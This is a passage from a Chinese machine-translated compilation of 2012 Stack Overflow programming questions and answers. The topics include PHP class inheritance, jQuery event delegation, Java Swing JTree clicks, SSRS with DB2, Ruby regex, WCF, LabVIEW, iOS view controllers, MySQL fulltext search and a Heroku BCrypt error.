<?php
class trackem {

public $hostnm;
public $ip;
public $info;

public function __construct() {
}

public function getNm($hostnm){
    $hostnm = gethostbyaddr($_SERVER['REMOTE_ADDR']);
    //echo $hostnm;
}
public function getIp($ip){
    $ip =  $_SERVER['SERVER_ADDR'];
    //echo $ip;
}
public function getBrws($info){
    $info = get_browser(null, true);
    //print_r($info);
}

}

class trackem2file extends trackem{

function wrtInfo(){
    //parent::getBrws($info);
    //parent::getIp($ip);
    //parent::getNm($hostnm);
    parent::__construct();

    $this->hostnm = parent::getNm($hostnm);
    $this->ip = parent::getIp($ip);
    $this->info = parent::getBrws($info);
    $this->filename = 'txt/trackfile.txt';

    $this->fh = fopen($this->filename, 'w');
    fwrite($this->fh, $this->hostnm . '\r\n');
    fwrite($this->fh, $this->ip . '\r\n');
    fwrite($this->fh, $this->info . '\r\n');
    fwrite($this->fh, '--------------------' . '\r\n');
    fclose($this->fh);

}
}

$track2 = new trackem2file();
$track2->wrtInfo();
?> 
```

我已经尝试找到解决方案大约 2 天了，并且我已经阅读了一些关于对象继承和变量未加载到扩展类的其他帖子，但对帮助我解决这个问题没有足够的帮助。所以我现在请求你的帮助。

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T14:55:00.267

你需要像这样使用它们，你错过了`$this->`：

```
$this->info;
$this->ip;
$this->hostnm; 
```

尝试这个：

```
<?php
class trackem
{
    public $hostnm;
    public $ip;
    public $info;

    public function __construct()
    {
    }

    public function getNm()
    {
        $this->hostnm = gethostbyaddr($_SERVER['REMOTE_ADDR']);
    }
    public function getIp()
    {
        $this->ip = $_SERVER['SERVER_ADDR'];
    }
    public function getBrws()
    {
        $this->info = get_browser(null, true);
    }

}

class trackem2file extends trackem
{
    function wrtInfo()
    {
        parent::__construct();

        $this->getNm();
        $this->getIp();
        $this->getBrws();
        $filename = 'txt/trackfile.txt';

        $fh = fopen($filename, 'w');
        fwrite($fh, $this->hostnm . '\r\n');
        fwrite($fh, $this->ip . '\r\n');
        fwrite($fh, $this->info . '\r\n');
        fwrite($fh, '--------------------' . '\r\n');
        fclose($fh);

    }
}

$track2 = new trackem2file();
$track2->wrtInfo();
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T15:14:24.980

```
class trackem
{
    public $hostnm
    public $ip;
    public $info;

    public function __construct()
    {
        $this->hostnm = gethostbyaddr($_SERVER['REMOTE_ADDR']);
        $this->ip = $_SERVER['SERVER_ADDR'];
        $this->info = get_browser(null, true);
    }
}

class trackem2file extends trackem
{
    public function wrtInfo()
    {
        $data = join(PHP_EOL, [$this->hostnm, $this->ip, $this->info]);
        file_put_contents('txt/trackfile.txt', $data);
    }
}

$track2 = new trackem2file();
$track2->wrtInfo(); 
```

# c# - 领域模型聚合

> ID：13418962
> 
> 赞同：0
> 
> 时间：2012-11-16T14:51:36.037
> 
> 标签：c#, architecture, domain-driven-design, domain-model

我刚刚阅读了关于聚合的一章，发现我误解了一些东西。我们有三个对象：Member、Item、Bid。这是书中的代码片段：

```
public class Member
{
   public string Id {get; set;}
   ...
}

public class Item
{
   public string Id {get; set;}
   public IList<Bid> Bids {get; set;}
   ...
}

public class Bid
{
   public Member Member {get; set;}
   ...
} 
```

Autor 写道，项目及其出价是一个集合，因为没有项目，出价就没有意义。所以 Item 和 Member 是聚合根。但是，我认为没有会员的投标也没有意义。这似乎是合乎逻辑的。那么在这种情况下，什么是投标？它是项目聚合的一部分吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T15:13:00.283

首先，**聚合**和**聚合根**是***不同的概念***。在这种情况下，Item 和 Bid 可能是同一个聚合的一部分，但只有一个，我认为 Item 是聚合根 (AR)。

定义哪个类是 AR 高度依赖于有界上下文 (BC)。此外，该 Member 类可能仅表示为该 BC 中的简单 Id，这不是您可能在不同 BC 中使用的 Member（您会看到 DDD 非常棘手）。

Item 涉及 Bid 和 Member，它们共同构成一个聚合，但 Item 是聚合根，即其他人用来管理聚合的外观对象。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T15:03:28.350

虽然不完全相同，但这与[这个 SO question](https://stackoverflow.com/questions/6752850/a-quick-question-about-aggregate-relational-objects-in-mvc)非常相似，Richard Cirerol 的答案是一个不错的答案。

但是，我会向您指出[第 71 页的书](http://books.google.com/books?id=gzfFQrs_qQAC&pg=PA82&lpg=PA82&dq=mvc%20member%20item%20bid&source=bl&ots=EXEadpscVK&sig=u1Wj_qL82p4iIBFx1aQaWsswBkM&hl=en&sa=X&ei=QFSmUO3jNcmEygGekICwBg&ved=0CEcQ6AEwAg#v=onepage&q=mvc%20member%20item%20bid&f=false)，其中的图表显示出价引用了成员，因此可以到达 OUT 以获取该信息，但该成员无法到达 IN。进入的唯一方法是通过该项目。因此，该项目是示例中的控制点。这有助于保持清晰和事务性的界限。

# javascript - jQuery .on('change', function() {} 不会触发动态创建的输入

> ID：13418963
> 
> 赞同：171
> 
> 时间：2012-11-16T14:51:37.580
> 
> 标签：javascript, jquery

问题是我有一些动态创建的输入标签集，而且我还有一个函数可以在输入值更改时触发。

```
$('input').on('change', function() {
  // Does some stuff and logs the event to the console
}); 
```

但是，`.on('change')`不会触发任何动态创建的输入，仅适用于加载页面时存在的项目。不幸的是，这让我有点困惑，因为这`.on`意味着要替换所有这些都是：/`.live()``.delegate()``.bind()`

有没有其他人遇到过这个问题或知道解决方案？

* * *

## 回答 #1

> 赞同：310
> 
> 时间：2012-11-16T14:53:33.020

您应该为该`on`函数提供一个选择器：

```
$(document).on('change', 'input', function() {
  // Does some stuff and logs the event to the console
}); 
```

在这种情况下，它将按您的预期工作。此外，最好指定一些元素而不是文档。

阅读这篇文章以获得更好的理解：[http ://elijahmanor.com/differences-between-jquery-bind-vs-live-vs-delegate-vs-on/](http://elijahmanor.com/differences-between-jquery-bind-vs-live-vs-delegate-vs-on/)

* * *

## 回答 #2

> 赞同：26
> 
> 时间：2016-05-05T10:58:44.417

用这个

```
$('body').on('change', '#id', function() {
  // Action goes here.
}); 
```

* * *

## 回答 #3

> 赞同：25
> 
> 时间：2018-05-02T07:14:49.900

您可以使用以下几种方法中的任何一种：

```
$("#Input_Id").change(function(){   // 1st way
    // do your code here
    // Use this when your element is already rendered
});

$("#Input_Id").on('change', function(){    // 2nd way
    // do your code here
    // This will specifically call onChange of your element
});

$("body").on('change', '#Input_Id', function(){    // 3rd way
    // do your code here
    // It will filter the element "Input_Id" from the "body" and apply "onChange effect" on it
}); 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2018-04-03T06:40:56.010

只是为了澄清一些潜在的混乱。这仅在元素存在于 DOM 加载时才有效：

```
$("#target").change(function(){
    //does some stuff;
}); 
```

当稍后动态加载元素时，您可以使用：

```
$(".parent-element").on('change', '#target', function(){
   //does some stuff;
}); 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2015-09-01T12:41:51.417

```
$("#id").change(function(){
    //does some stuff;
}); 
```

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2020-02-06T16:01:49.400

您可以使用：

```
$('body').ready(function(){
   $(document).on('change', '#elemID', function(){
      // do something
   });
}); 
```

它对我有用。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2018-11-30T08:15:23.160

```
$(document).on('change', '#id', aFunc);

function aFunc() {
  // code here...
} 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2019-08-02T09:03:10.107

您可以使用“输入”事件，该事件在元素获得用户输入时发生。

```
$(document).on('input', '#input_id', function() {
  // this will fire all possible change actions
}); 
```

[w3](https://www.w3schools.com/jsref/event_oninput.asp)的文档

# java - 将 MouseListener 与 JTree 一起使用

> ID：13418971
> 
> 赞同：2
> 
> 时间：2012-11-16T14:52:01.590
> 
> 标签：java, swing, mouseevent, jtree, mouselistener

我正在使用 a来检测对项目的`MouseListener`双击。`JTree`那`JTree`是位于一个`JScrollPane`. 当我检测到双击 (a `MouseEvent`) 时，我从`JTree`. 大多数情况下，这工作正常。

现在，如果我双击带有子节点的（折叠）节点，该节点会展开，因此滚动窗格会向下滚动。当我尝试从单击位置获取树路径时，会`JTree`查看当前（滚动）视图并返回错误的项目，因为单击位置指的是前一个视图（未滚动）。

有谁知道如何解决这个问题？下面，我将附上一个示例来演示该问题。

* * *

```
package test;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import javax.swing.JDialog;
import javax.swing.JScrollPane;
import javax.swing.JTree;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.TreeNode;
import javax.swing.tree.TreePath;

public class TestMain extends JDialog implements MouseListener {

    protected final JTree tree;

    public TestMain() {
        tree = new JTree(getRootNode());
        tree.addMouseListener(this);

        JScrollPane pane = new JScrollPane(tree);
        pane.setPreferredSize(new Dimension(250, 300));

        getContentPane().add(pane, BorderLayout.CENTER);
        pack();
    }

    private TreeNode getRootNode() {
        DefaultMutableTreeNode root = new DefaultMutableTreeNode("Root");

        for (int i = 0; i < 10; i++) {
            root.add(new DefaultMutableTreeNode("Node " + i));
        }

        DefaultMutableTreeNode sub = new DefaultMutableTreeNode("Sub");
        root.add(sub);

        for (int i = 0; i < 10; i++) {
            sub.add(new DefaultMutableTreeNode("Sub " + i));
        }

        return root;
    }

    @Override
    public void mouseClicked(MouseEvent e) {
        if (e.getClickCount() == 2) {
            TreePath path = tree.getPathForLocation(e.getX(), e.getY());
            if (path != null) {
                System.out.println(path.getLastPathComponent().toString());
            }
        }
    }

    @Override
    public void mousePressed(MouseEvent e) {

    }

    @Override
    public void mouseReleased(MouseEvent e) {

    }

    @Override
    public void mouseEntered(MouseEvent e) {

    }

    @Override
    public void mouseExited(MouseEvent e) {

    }

    public static void main(String[] args) {
        JDialog dialog = new TestMain();
        dialog.setVisible(true);
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T15:02:50.627

我建议您使用`JTree.getSelectionPath().getLastPathComponent()`，因为它不会在滚动时改变。

# reporting-services - SSRS 中的 DB2 数据源

> ID：13418984
> 
> 赞同：3
> 
> 时间：2012-11-16T14:52:51.710
> 
> 标签：reporting-services, db2, ssrs-2008

我必须从 SSRS 连接到 Db2 数据源并创建报告。我在我的系统上安装了最新的 Db2 客户端。

在 SSRS 中添加数据源时，我选择了“OLEDB”数据源，然后选择了“IBM OLEDB Provider”，在输入服务器名、用户名、密码后...

> 在 db2dsdriver.cfg 配置文件中找不到数据库别名。

有人能指出我正确的方向吗

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T15:01:16.247

可以在[此处](http://publib.boulder.ibm.com/infocenter/db2luw/v9r5/index.jsp?topic=/com.ibm.swg.im.dbclient.config.doc/doc/c0054555.html)找到有关该特定文件的 IBM 文档。它解释了它是什么，并解释了如何编辑它。

本质上，您需要编辑报表服务器上的文件并添加服务器名称。

摘录：

> 可以编辑 db2dsdriver.cfg 配置文件。但是，必须手动编辑该文件。此外，编辑文件后，您必须重新启动应用程序才能使更改生效。配置文件创建在以下路径之一：对于数据服务器客户端，配置文件创建在实例路径下名为 cfg 的文件夹中：
> 
> *   在 AIX®、HP-UX、Linux 或 Solaris 操作系统上，instance_path/cfg
> *   在 Windows 操作系统上，instance_path\cfg
> 
> 对于数据服务器驱动程序，配置文件创建在安装路径下名为 cfg 的文件夹中：
> 
> *   在 AIX、HP-UX、Linux 或 Solaris 操作系统上，installation_path/cfg
> *   在 Windows 操作系统上，installation_path\cfg
> 
> 随附的示例配置文件可帮助您入门。它位于 sqllib/cfg 目录中。配置文件包含以下部分：
> 
> *   DSN_Collection 标记中包含的数据源名称部分，
> *   数据库标签中包含的数据库信息部分，
> *   包含在参数标签中的全局属性部分。

```
<configuration>
    <DSN_Collection>
        <dsn alias="alias1" name="name1" host="server1.net1.com" port="50001"/>
        <!-- Long aliases are supported -->
        <dsn alias="longaliasname2" name="name2" host="server2.net1.com" port="55551">
            <parameter name="Authentication" value="Client"/>
        </dsn>
    </DSN_Collection>
    <databases>
        <database name="name1" host="server1.net1.com" port="50001">
            <parameter name="CurrentSchema" value="OWNER1"/>
            <WLB>
                <parameter name="enableWLB" value="true"/>
                <parameter name="maxTransports" value="50"/>
            </WLB>
            <ACR>
                <parameter name="enableACR" value="true"/>
            </ACR>
        </database>
        <!-- Local IPC connection -->
        <database name="name3" host="localhost" port="0">
            <parameter name="IPCInstance" value="DB2"/>
            <parameter name="CommProtocol" value="IPC"/>
        </database>
    </databases>
    <parameters>
        <parameter name="GlobalParam" value="Value"/>
    </parameters>
</configuration> 
```

# ruby-on-rails - 替换Ruby中所有包含字符串的行

> ID：13418985
> 
> 赞同：0
> 
> 时间：2012-11-16T14:52:52.033
> 
> 标签：ruby-on-rails, ruby

我需要在 Ruby 的 Makefile 中替换一个变量

对于 ex（在 Makefile 中）：

```
VAR = 123 
```

我正在做的是：

```
puts text.gsub("VAR = 123", "VAR_NEW = 456") 
```

问题是我不知道值，所以我想使用正则表达式来替换所有包含 VAR = 的行

我可以使用什么正则表达式？我可以使用不同的方法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T15:24:35.850

```
 q.sub /VAR = .*/, 'VAR = 456' # replace one line 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T15:00:37.557

您可以使用这样的正则表达式：

```
var = 123
new = 456
text.gsub(/\b#{var}\s?= .+/, "var = #{new}") 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-16T15:21:27.827

如果我理解正确，您可以这样做：

```
irb(main):001:0> text = <<EOF
irb(main):002:0" VAR1 = 111
irb(main):003:0" VAR2 = 222
irb(main):004:0" EOF
=> "VAR1 = 111\nVAR2 = 222\n"
irb(main):005:0> puts text
VAR1 = 111
VAR2 = 222
=> nil
irb(main):007:0> text.gsub!(/^VAR2\s\=\s\d+/, "NEW_VAR = 555")
=> "VAR1 = 111\nNEW_VAR = 555\n"
irb(main):008:0> puts text
VAR1 = 111
NEW_VAR = 555
=> nil 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-16T15:21:39.170

这个工具将帮助你弄清楚 [http://rubular.com/](http://rubular.com/)

或许这

```
test.gsub(/^(VAR=\s*(['"]?))\d+\2/, $1 + "456" + $2) 
```

也就是说，如果您只想更改变量的值

编辑：

```
test.gsub(/^(VAR=\s*(['"]?))\d+\2\s*$/, $1 + "456" + $2) 
```

编辑 2

```
test.gsub(/^(VAR=\s*(['"]?)).*\2\s*$/, $1 + "456" + $2) 
```

# wcf - 当其他项目中的faultcontracttype时WCF企业库异常处理失败

> ID：13418992
> 
> 赞同：0
> 
> 时间：2012-11-16T14:53:15.870
> 
> 标签：wcf, .net-4.0, enterprise-library, .net-assembly

背景：我有一个使用 Microsoft 企业库 WCF 异常处理的 WCF 项目。

我们最近决定将我们的操作和数据合同转移到一个名为 comanynamespace.xxx.WCF.Utilities 的单独项目（.net 程序集）中。移动操作和数据契约后，我更改了 faultContractType 命名空间以反映新的程序集。

现在，当我在 VS2010 中启动 Web 服务时，出现以下错误：

尝试获取 ExceptionPolicyImpl 类型的实例时发生激活错误，键“WCF 异常屏蔽”

我尝试过：确保两个项目中存在相同的引用，并确保两个项目都在 .net 4（无客户端模式）下运行，等等。两者都没有帮助解决问题。

最后，我将 Service Fault 类复制回 Web Service 项目，并将 web.config 中的命名空间更改为指向本地命名空间：来自：

> faultContractType="comanynamespace.xxx.WCF.Utilities.ServiceFault, comanynamespace.xxx.WCF.Utilities.Services"

到：

> faultContractType="comanynamespace.xxx.Web.Services.ServiceFault, comanynamespace.xxx.Web.Services"

这确实解决了错误，但是，现在我必须在两个位置都有我的服务故障数据合同。

有谁知道为什么我无法通过 Microsoft EL WCF 异常处理在另一个 .net 程序集中使用服务故障（数据合同）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T20:11:00.180

问题最终是 faultcontracttype 的命名空间（第二部分）设置为

> faultContractType="companyname.xxx.WCF.Utilities.Services.ServiceFault, companyname.xxx.WCF.Utilities.Services"

代替

> faultContractType="companyname.xxx.WCF.Utilities.Services.ServiceFault, companyname.xxx.WCF.Utilities"

companyname.xxx.WCF.Utilities 是程序集的命名空间。

# javascript - 同一页面上的 jQuery 和 javascript 代码不起作用

> ID：13418993
> 
> 赞同：6
> 
> 时间：2012-11-16T14:53:17.123
> 
> 标签：javascript, jquery

我对 jQuery 和 javascript 代码有疑问；当我在下面写这个jQuery`</head>`时`<body>`

```
<script type="text/javascript">
    var $j = jQuery.noConflict();
    $j(document).ready(function(){
        $j('#page_effect').fadeIn(3000);
    });
</script> 
```

然后在body标签中写javascript代码

```
<script src="bubbles.js"></script>
<script type="text/javascript">
    bubblesMain(new Object({
        type : 'linear',
        minSpeed : 100,
        maxSpeed : 400,
        minSize : 30,
        maxSize : 55,
        num : 100,
        colors : new Array('#FF0000','#FFFFFF','#FFCC99', '#FF33CC')
    }));
</script> 
```

然后 jQuery 代码可以工作，但 javascript 代码不起作用。最后我发现当我第一次加载后调整浏览器大小时，运行是可以的。

bubble.js 是自动创建一个画布元素，然后在画布内引发一些带有动画的气泡。

部分代码如下：

```
function bubblesMain(obj){
    bubbleResize();
    bubbles = new bubbleObject(obj);
    bubbles.createBubbles();
    setInterval(start,1000/60);
};

//WHEN WINDOW HEIGHT IS CHANGED, REMAKE THE CANVAS ELEMENT
window.onresize = function(event) {
    bubbleResize();
}

function bubbleResize(){
    var height = parseInt(document.getElementById("canvasBubbles").clientHeight);
    var width = parseInt(document.getElementById("canvasBubbles").clientWidth);
    document.getElementById("canvasBubbles").innerHTML = '<canvas id="canvas" width="'+width+'px" height="'+height+'px"></canvas>';
}

function start(){

    var canvas = document.getElementById("canvas");
    canvas.width = canvas.width;
    bubbles.move();
    bubbles.draw();
}; 
```

我有一个`<div id="canvasBubbles"></div>`indise html。

然后在我将以下代码添加到bubbles.js 之后，它就可以运行了。

```
window.onload = function(event) {
    bubbleResize();
} 
```

我想知道是否有人可以为此提出更聪明的解决方案？谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T04:22:41.163

如其他答案所述，`<script>`标签应该是标签之前的最后一件事`</body>`。[看到这个问题。](https://stackoverflow.com/questions/436411/where-is-the-best-place-to-put-script-tags-in-html-markup)

放置标签的问题在于 HTML 页面的正文尚未加载，因此无法进行操作。`window.onload`和工作的原因`window.onresize`是因为它们稍后被调用，当文档的主体可用于使用 JS 操作时。

鉴于您的问题中提供的详细信息，您不需要该`jQuery.noConflict()`声明。

这是您的代码的替代版本，它应该做同样的事情，但效率更高。`body`将它放在元素的末尾，就在`</body>`标签之前。我没有测试它，因为我没有所需的所有脚本（气泡等）。

```
<!-- this goes at the end of your body element, just before the closing tag -->
<script type="text/javascript" src="bubbles.js"></script>
<script type="text/javascript">

    $.ready(function(){

        var canvasWrap,
            canvasElm,
            bubbles;

        init();

        setInterval(update, 1000/60);

        window.onresize = resize;

        $('#page_effect').fadeIn(3000);

        function init(){

            canvasWrap = document.getElementById("canvasBubbles");
            canvasElm = document.createElement('canvas');
            canvasElm.setAttribute('id', 'canvas');
            canvasElm.setAttribute('width', canvasWrap.clientWidth);
            canvasElm.setAttribute('height', canvasWrap.clientHeight);
            canvasWrap.appendChild(canvasElm);

            bubbles = new bubbleObject({
                type: 'linear',
                minSpeed: 100,
                maxSpeed: 400,
                minSize: 30,
                maxSize: 55,
                num: 100,
                colors: ['#FF0000','#FFFFFF','#FFCC99', '#FF33CC']
            });
            bubbles.createBubbles();
            update(); // you might not need this
        }

        function resize() {
            canvasElm.setAttribute('width', canvasWrap.clientWidth);
            canvasElm.setAttribute('height', canvasWrap.clientHeight);
        }

        function update(){
            // canvasElm.width = canvasElm.width; // is this a hack for something?
            bubbles.move();
            bubbles.draw();
        };

    });
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T15:38:36.360

You can write all this inside `<body>...</body>` or inside `<head> ... </head>` NOT works between `</body>` and `<head>` tag (maybe works for some less formal browser like old IE).

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-06T00:48:08.793

脚本标签应始终位于页面底部的标签之前，除非出于某种原因需要在此之前执行代码。

据我所知，仅当您在同一页面上使用两个都使用美元符号的不同库（即 jQuery 和 MooTools）时，才需要 jQuery noConflict() 方法。您可以使用 jQuery 和 vanilla javascript 而无需使用 noConflict 没有任何问题。

# image - 增加亮度图像LabVIEW

> ID：13418994
> 
> 赞同：1
> 
> 时间：2012-11-16T14:53:21.080
> 
> 标签：image, labview, brightness

我正在尝试在LabVIEW中制作一个程序来调整图像的亮度。

我通过为每个红色、绿色和蓝色值添加一个特定值来增加亮度。我通过移动滑块获得该值。

我用公式节点制作了程序，但它总是出错。

我希望你能帮助我。

**框图：**

![框图 1](../Images/2ea4b2506dededa25a829b37f95381a5.png)

![框图 2](../Images/b89d5b6baa471601f4756bb1b7f016db.png)

**错误：**

第 6 行的错误由“#”字符标记：“ *...Blue; int truncate(#int value); new* ”

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-17T11:25:33.280

LabVIEW附带了一个名为[hilite color](http://zone.ni.com/reference/en-XX/help/371361J-01/lvpict/hilite_color/)的函数： ![此图像是您直接拖放到 VI 程序框图的片段](../Images/6eb81a5f2d5b9a7cdfc30fc26ed53185.png)

（此图像是您直接拖放到 VI 程序框图的片段）

吨

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T22:14:50.087

如果我错了，请纠正我，但我虽然不可能在公式节点中使用类似 C 的函数。您需要使用 LabVIEW 来限制范围。我附上了等效代码的屏幕截图，但我确信有一种更有效的方法来改变图像亮度。

![框图](../Images/4137bc3158a0685a4236c9c7c93c61ef.png)

# iphone - 我无法将值从一个视图控制器传递到另一个视图控制器

> ID：13418995
> 
> 赞同：0
> 
> 时间：2012-11-16T14:53:21.303
> 
> 标签：iphone, objective-c, uiview, uiviewcontroller

嗨，我有一个问题，当我单击按钮时，我无法通过按钮将值从一个视图控制器传递到另一个视图控制器，其他视图出现在 iphone 屏幕上，但我设置的值不显示这是按钮代码

```
 -(IBAction)save:(id)sender 
{ 
nextview *admin = [[nextview alloc]init];
    [self presentModalViewController:admin animated:YES]; 
    if (admin.view)
    { 
admin.fetchname = name.text; 
} 
    [admin release];
} 
```

这是 nextview.h 文件

```
#import <UIKit/UIKit.h>
@interface nextview : UIViewController
{
    UILabel *getname;

    NSString *fetchname;
}
@property (nonatomic,retain) IBOutlet NSString *fetchname;
@property (nonatomic,retain) IBOutlet UILabel *getname;

@end 
```

这是 nextview.m 文件

```
#import "nextview.h"
#import "ViewController.h"

@implementation nextview
@synthesize getname,fetchname;
- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {

    }
    return self;
}

- (void)didReceiveMemoryWarning
{
    // Releases the view if it doesn't have a superview.
    [super didReceiveMemoryWarning];

    // Release any cached data, images, etc that aren't in use.
}
#pragma mark - View lifecycle

- (void)viewDidLoad
{

    getname.text = self.fetchname;

    [super viewDidLoad];

}

- (void)viewDidUnload
{
    [super viewDidUnload];

}

- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    // Return YES for supported orientations
    return (interfaceOrientation == UIInterfaceOrientationPortrait);
}
@end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T15:57:20.247

viewDidLoad 方法在您有机会分配 NSString 值之前被调用。这就是为什么您在 UIButton 中看不到文本的原因。尝试这个 ：

```
-(IBAction)save:(id)sender 
{ 
    nextview *admin = [[nextview alloc] init];

    admin.fetchname = name.text; 

    [self presentModalViewController:admin animated:YES];  
    [admin release];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T17:07:08.043

你可以做这样的事情。您可以在 nextView.h 中实现以下代码

```
 NSString *fetchData; 
```

也属性和合成这个

```
 @property(nonatomic, retain)  NSString *fetchData; 
```

在按钮按下的代码上实现这个

```
 -(IBAction)save:(id)sender 
         { 
                nextview *admin = [[nextview alloc] init];

                admin.fetchData = name.text; 

                [self presentModalViewController:admin animated:YES];  
                [admin release];
          } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-16T15:01:53.733

```
 -(IBAction)save:(id)sender 
   { 
          nextview *admin = [[nextview alloc]init];
          [self presentModalViewController:admin animated:YES]; 
          if (admin.view)
          { 
                 admin.fetchname = name.text; 
          } 
          [admin release];
   } 
```

在分配名称后立即释放 nextview 的实例。那也行不通。

顺便说一句，getname 和 fetchname 是非常糟糕的属性名称。

# mysql - MySQL全文自动完成搜索问题

> ID：13418996
> 
> 赞同：2
> 
> 时间：2012-11-16T14:53:23.267
> 
> 标签：mysql, search, full-text-search

所以我一直在努力进行 FULLTEXT 索引搜索，[这里](https://stackoverflow.com/questions/13196290/mysql-fulltext-search-not-returning-expected-results)有一个以前的问题已解决，但似乎对于某些搜索它工作正常，而在其他搜索它没有

和以前一样，在游戏表中查找游戏，大约有 25k 行，在 g_name 上具有 FULLTEXT 索引。我还需要它使用自动完成功能，例如不完整的搜索词

使用搜索词，我将其分解，然后循环每次迭代，在末尾附加一个 *，例如 'grand* theft* auto* v*'

所以这里有一些示例搜索。它在顶部输出查询：

布尔模式关闭，结果正常

（链接失效）

布尔模式打开，结果未按预期返回

（链接失效）

布尔模式关闭，结果还可以，虽然不确定“天诛：暗影刺客”的得分与其他“刺客信条”游戏的相关性如何？

（链接失效）

布尔模式打开，结果未显示“刺客信条 iii”

（链接失效）

自动完成短信部分单词，布尔模式关闭，没有结果？！

（链接失效）

自动完成短信部分单词，布尔模式关闭，结果正常

（链接失效）

不知道为什么打开/关闭布尔模式会产生如此奇怪的结果。就像我需要它来进行某些搜索而关闭其他搜索，但我需要一个搜索查询。分数似乎只是不知从何而来的 BS 数字。

此外，如果我开始在非可选单词的组合中添加“+”，它会产生更奇怪的结果。我添加全文的全部原因是为了让事情更灵活，并返回更有用的结果，但似乎让事情变得更糟。

**所以我的问题**是，无论该特定搜索词/游戏的细微差别如何，以及它是部分搜索还是完整搜索，我如何让它每次都返回有用的结果。理想情况下类似于[http://www.metacritic.com/](http://www.metacritic.com/)的做法（右上角的搜索框）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T07:18:05.653

我教授的一个课程项目涵盖了这个主题：[https](https://grape.ics.uci.edu/wiki/public/wiki/cs122b-2012-spring-project4#Requirement2) ://grape.ics.uci.edu/wiki/public/wiki/cs122b-2012-spring-project4#Requirement2 解决方案：[https ://grape.ics.uci.edu/ wiki/public/wiki/cs122b-2012-spring-mysql-fulltext](https://grape.ics.uci.edu/wiki/public/wiki/cs122b-2012-spring-mysql-fulltext) 注意以下示例：

前缀搜索：SELECT entryID FROM ft WHERE MATCH (entry) AGAINST ('grad*' IN BOOLEAN MODE);

布尔搜索：SELECT entryID FROM ft WHERE MATCH (entry) AGAINST ('+graduate -michigan' IN BOOLEAN MODE);

这种方法有效，但速度慢且排名不佳。

# ruby-on-rails - 将 Ruby Bcrypt 与 Heroku 一起使用

> ID：13418998
> 
> 赞同：1
> 
> 时间：2012-11-16T14:53:28.787
> 
> 标签：ruby-on-rails, ruby-on-rails-3, heroku, bcrypt

有一个使用 BCrypt 哈希密码的 Ruby on Rails 应用程序，用户模型有

```
require "BCrypt" 
```

并且gemfile有

```
gem 'bcrypt-ruby' 
```

这在本地运行时一切正常，但是当我将它部署到我的 Heroku 服务器时，我收到以下错误

```
2012-11-16T14:42:32+00:00 app[web.1]: Exiting
2012-11-16T14:42:32+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/railties-3.2.6/lib/rails/application/finisher.rb:53:in `block in <module:Finisher>'
2012-11-16T14:42:32+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/railties-3.2.6/lib/rails/engine.rb:436:in `eager_load!'
2012-11-16T14:42:32+00:00 app[web.1]: => Ctrl-C to shutdown server
2012-11-16T14:42:32+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/activesupport-3.2.6/lib/active_support/dependencies.rb:312:in `depend_on'
2012-11-16T14:42:32+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/activesupport-3.2.6/lib/active_support/dependencies.rb:225:in `require_dependency'
2012-11-16T14:42:32+00:00 app[web.1]: /app/vendor/bundle/ruby/1.9.1/gems/activesupport-3.2.6/lib/active_support/dependencies.rb:317:in `rescue in depend_on': No such file to load -- BCrypt (LoadError)
2012-11-16T14:42:32+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/railties-3.2.6/lib/rails/engine.rb:439:in `block (2 levels) in eager_load!'
2012-11-16T14:42:32+00:00 app[web.1]:   from /app/vendor/bundle/ruby/1.9.1/gems/railties-3.2.6/lib/rails/initializable.rb:30:in `instance_exec'
...
2012-11-16T14:42:32+00:00 app[web.1]:   from script/rails:6:in `<main>'
2012-11-16T14:42:33+00:00 heroku[web.1]: Process exited with status 1
2012-11-16T14:42:33+00:00 heroku[web.1]: State changed from crashed to down
2012-11-16T14:42:33+00:00 heroku[web.1]: State changed from starting to crashed
2012-11-16T14:42:34+00:00 heroku[router]: at=error code=H10 desc="App crashed" method=GET path=/ host=smartaprofiles.herokuapp.com fwd= dyno= queue= wait= connect= service= status=503 bytes= 
```

我假设问题是`No such file to load -- BCrypt (LoadError)`但似乎无法修复它，`bundle install`并且`bundle update`工作正常，它说 bcrypt-ruby 安装正常。
有什么想法可以解决这个问题吗？我都出来了！

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-18T11:51:48.337

